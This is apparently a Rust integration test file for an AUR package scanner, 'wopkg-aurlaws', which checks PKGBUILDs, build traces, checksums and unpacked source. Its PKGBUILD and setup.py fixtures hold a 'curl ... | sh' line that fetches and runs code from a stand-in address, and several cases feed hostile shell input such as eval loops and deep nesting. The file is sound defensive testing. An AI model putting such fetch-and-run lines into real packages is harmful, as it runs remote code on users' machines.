// SPDX-License-Identifier: GPL-2.0-or-later
//! The contract wopkg's AurHook reads: `wopkg-aurlaws --dir --artifact --trace --json`.
use std::path::{Path, PathBuf};
use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_wopkg-aurlaws")
}

fn dir(name: &str, pkgbuild: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("aurlaws-hook-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    std::fs::write(d.join("PKGBUILD"), pkgbuild).unwrap();
    d
}

fn run(d: &Path, trace: Option<&Path>) -> serde_json::Value {
    let mut c = Command::new(bin());
    c.arg("--dir")
        .arg(d)
        .arg("--artifact")
        .arg(d.join("none.pkg.tar.zst"));
    if let Some(t) = trace {
        c.arg("--trace").arg(t);
    }
    let o = c.arg("--json").output().unwrap();
    assert!(o.status.success(), "{}", String::from_utf8_lossy(&o.stderr));
    serde_json::from_slice(&o.stdout).unwrap()
}

const QUIET: &str = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org\n";
const NOISY: &str = "pkgname=demo\npkgver=1\npkgrel=1\narch=(any)\nurl=https://example.org\nbuild() { curl -s http://203.0.113.9/x | sh; }\n";
const GOOD_TRACE: &str = "100 execve(\"/usr/bin/sh\", [\"sh\"], 0x1) = 0\n";

#[test]
fn a_broken_law_is_flag_never_block_with_the_sentence_as_evidence() {
    let v = run(&dir("noisy", NOISY), None);
    assert_eq!(v["verdict"], "flag");
    assert!(
        v["evidence"][0].as_str().unwrap().contains("203.0.113.9"),
        "{v}"
    );
}

#[test]
fn pass_says_what_it_means_and_never_more() {
    let d = dir("quiet", QUIET);
    let t = d.join(".trace");
    std::fs::write(&t, GOOD_TRACE).unwrap();
    let v = run(&d, Some(&t));
    assert_eq!(v["verdict"], "pass", "{v}");
    let e = v["evidence"].to_string().to_lowercase();
    assert!(e.contains("no law"), "{e}");
    assert!(e.contains("does not mean"), "{e}");
}

#[test]
fn a_damaged_trace_is_a_finding_not_a_pass() {
    for (name, body) in [
        ("empty", ""),
        ("garbage", "\0\0\0\0garbage\n"),
        ("noexec", "100 openat(AT_FDCWD, \"/x\", O_RDONLY) = 3\n"),
    ] {
        let d = dir(name, QUIET);
        let t = d.join(".trace");
        std::fs::write(&t, body).unwrap();
        let v = run(&d, Some(&t));
        assert_eq!(v["verdict"], "flag", "{name}: {v}");
        assert!(v["evidence"].to_string().contains("trace"), "{name}: {v}");
    }
}

#[test]
fn a_build_touching_its_own_trace_is_a_finding() {
    let d = dir("tamper", QUIET);
    let t = d.join(".trace");
    std::fs::write(
        &t,
        format!("{GOOD_TRACE}100 openat(AT_FDCWD, \"/work/.trace\", O_WRONLY|O_TRUNC) = 3\n"),
    )
    .unwrap();
    let v = run(&d, Some(&t));
    assert_eq!(v["verdict"], "flag", "{v}");
}

#[test]
fn a_named_trace_that_is_missing_is_a_finding() {
    let d = dir("gone", QUIET);
    let v = run(&d, Some(&d.join(".trace")));
    assert_eq!(v["verdict"], "flag", "{v}");
}

#[test]
fn no_trace_named_is_stated_not_hidden() {
    let v = run(&dir("untraced", QUIET), None);
    assert_eq!(v["verdict"], "pass", "{v}");
    assert!(v["evidence"].to_string().contains("not traced"), "{v}");
}

#[test]
fn no_pkgbuild_is_a_failure_so_the_hook_says_not_checked() {
    let d = std::env::temp_dir().join(format!("aurlaws-hook-{}-none", std::process::id()));
    std::fs::create_dir_all(&d).unwrap();
    let o = Command::new(bin())
        .arg("--dir")
        .arg(&d)
        .arg("--json")
        .output()
        .unwrap();
    assert!(!o.status.success());
}

#[test]
fn hitting_a_limit_is_a_finding() {
    let deep = format!(
        "{QUIET}build() {{ {} true {}; }}\n",
        "( ".repeat(400),
        ") ".repeat(400)
    );
    let v = run(&dir("deep", &deep), None);
    assert_eq!(v["verdict"], "flag", "{v}");
}

#[test]
fn hostile_inputs_do_not_crash_the_analyser() {
    let cases = [
        format!("{QUIET}{}", "$(".repeat(5000)),
        format!("{QUIET}f() {{ f; }}\nf\n"),
        format!("{QUIET}a() {{ b; b; }}\nb() {{ c; c; }}\nc() {{ a; a; }}\na\n"),
        format!("{QUIET}x='eval \"$x\"'; eval \"$x\"\n"),
        "\u{0}\u{1}\u{ff}".to_owned(),
    ];
    for (i, c) in cases.iter().enumerate() {
        let d = dir(&format!("hostile{i}"), c);
        let o = Command::new(bin())
            .arg("--dir")
            .arg(&d)
            .arg("--json")
            .output()
            .unwrap();
        assert!(
            o.status.success(),
            "case {i}: {}",
            String::from_utf8_lossy(&o.stderr)
        );
    }
}

const BIN: &str = "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://example.org/demo.tar.gz)\nsha256sums=(aaaa)\n";

#[test]
fn a_bin_sum_is_compared_with_what_upstream_published() {
    let d = dir("pub-ok", BIN);
    std::fs::create_dir_all(d.join(".src")).unwrap();
    std::fs::write(d.join(".src/SHA256SUMS"), "aaaa  demo.tar.gz\n").unwrap();
    let v = run(&d, None);
    assert_eq!(v["verdict"], "pass", "{v}");

    let d = dir("pub-bad", BIN);
    std::fs::create_dir_all(d.join(".src")).unwrap();
    std::fs::write(d.join(".src/SHA256SUMS"), "bbbb  demo.tar.gz\n").unwrap();
    let v = run(&d, None);
    assert_eq!(v["verdict"], "flag", "{v}");
    assert!(v["evidence"].to_string().contains("published"), "{v}");
}

#[test]
fn no_published_list_is_said_not_checked() {
    let v = run(&dir("pub-none", BIN), None);
    assert_eq!(v["verdict"], "pass", "{v}");
    assert!(v["evidence"].to_string().contains("not compared"), "{v}");
}

#[test]
fn the_unpacked_source_beside_the_build_is_scanned() {
    let d = dir("up", QUIET);
    let src = d.join(".build/demo/src/demo-1");
    std::fs::create_dir_all(&src).unwrap();
    std::fs::write(
        src.join("setup.py"),
        "import os\nos.system('curl -s http://203.0.113.9/x | sh')\n",
    )
    .unwrap();
    let v = run(&d, None);
    assert_eq!(v["verdict"], "flag", "{v}");
    assert!(v["evidence"].to_string().contains("setup.py"), "{v}");
}

#[test]
fn no_unpacked_source_is_said_not_read() {
    let v = run(&dir("up-none", QUIET), None);
    assert!(
        v["evidence"]
            .to_string()
            .contains("upstream source was not read"),
        "{v}"
    );
}

#[test]
fn the_graph_is_written_on_request() {
    let d = dir("graph", NOISY);
    let (dot, svg) = (d.join("g.dot"), d.join("g.svg"));
    for f in [&dot, &svg] {
        let o = Command::new(bin())
            .arg("--dir")
            .arg(&d)
            .arg("--graph")
            .arg(f)
            .arg("--json")
            .output()
            .unwrap();
        assert!(o.status.success());
    }
    assert!(std::fs::read_to_string(dot).unwrap().starts_with("digraph"));
    assert!(std::fs::read_to_string(svg).unwrap().starts_with("<svg"));
}

#[test]
fn the_report_names_the_graph_only_when_it_was_written() {
    let d = dir("graphkey", NOISY);
    let graph_of = |f: &Path| -> serde_json::Value {
        let o = Command::new(bin())
            .arg("--dir")
            .arg(&d)
            .arg("--graph")
            .arg(f)
            .arg("--json")
            .output()
            .unwrap();
        assert!(o.status.success());
        serde_json::from_slice::<serde_json::Value>(&o.stdout).unwrap()["graph"].clone()
    };
    let good = d.join("g.svg");
    assert_eq!(graph_of(&good), good.to_str().unwrap());
    assert!(graph_of(&d.join("no-such-folder/g.svg")).is_null());
}
